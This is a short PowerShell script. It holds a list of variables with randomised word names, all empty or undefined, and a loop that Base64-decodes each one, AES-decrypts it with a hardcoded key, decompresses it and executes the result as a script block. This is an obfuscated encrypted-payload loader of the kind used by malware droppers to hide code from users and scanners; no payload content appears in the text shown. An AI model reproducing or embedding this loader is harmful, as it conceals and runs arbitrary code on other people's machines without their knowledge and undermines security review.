$Eventuates = ""
$Middlebrow = ""
$Downstream = ""
$Remarriage = ""
$Impassable = ""
$Vegetating = ""
$Snowmobile = ""
$Evergreens = ""
$Migrations = ""
$Downswings = ""
$Reminisces = ""
$Impeccable = ""
$Composting = ""
$Assaulting = ""
$Pepperonis = ""
$Peroxiding = ""
$Comporting = ""

@($Vandalizes,$Sniggering,$Eventually,$Microscopy,$Downstairs,$Reluctance,$Variations,$Snorkelled,$Eventuates,$Middlebrow,$Downstream,$Remarriage,$Impassable,$Vegetating,$Snowmobile,$Evergreens,$Migrations,$Downswings,$Reminisces,$Impeccable,$Composting,$Assaulting,$Pepperonis,$Peroxiding,$Comporting) | ForEach-Object {
    $dec = [Convert]::FromBase64String($_)
    $aes = [Security.Cryptography.Aes]::Create()
    $outbuf = New-Object Byte[] ($dec.Length - $aes.IV.Length)
    $aes.Key = [Convert]::FromBase64String("p9CUYDqTIEbI5G6EGVuOzrMXJjzjxVORqyLnIb8yy/E=")
    $aes.IV = $dec[0..($aes.IV.Length - 1)]
    $rc = (New-Object Security.Cryptography.CryptoStream (New-Object IO.MemoryStream (, $dec[$aes.IV.Length..($dec.Length - 1)])), ($aes.CreateDecryptor()), ([Security.Cryptography.CryptoStreamMode]::Read)).Read($outbuf, 0, $outbuf.Length)
    try {
        $sb = $ExecutionContext.InvokeCommand.NewScriptBlock((ConvertFrom-Gzip -InputBuffer $outbuf[0..($rc - 1)]))
    } catch {
        $sb = $ExecutionContext.InvokeCommand.NewScriptBlock(([Text.Encoding]::UTF8.GetString($outbuf[0..($rc - 1)])))
    }
    . $sb
}
